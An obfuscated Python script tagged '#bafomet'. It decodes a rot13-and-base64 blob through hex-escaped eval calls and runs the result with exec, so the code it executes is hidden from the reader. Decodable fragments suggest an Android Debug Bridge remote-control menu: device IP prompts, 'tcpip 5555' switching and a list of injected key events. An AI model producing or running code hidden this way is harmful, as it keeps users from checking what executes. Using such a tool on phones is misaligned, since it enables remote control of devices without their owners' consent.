#bafomet
import base64, codecs
magic = ''
love = ''
god = ''
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
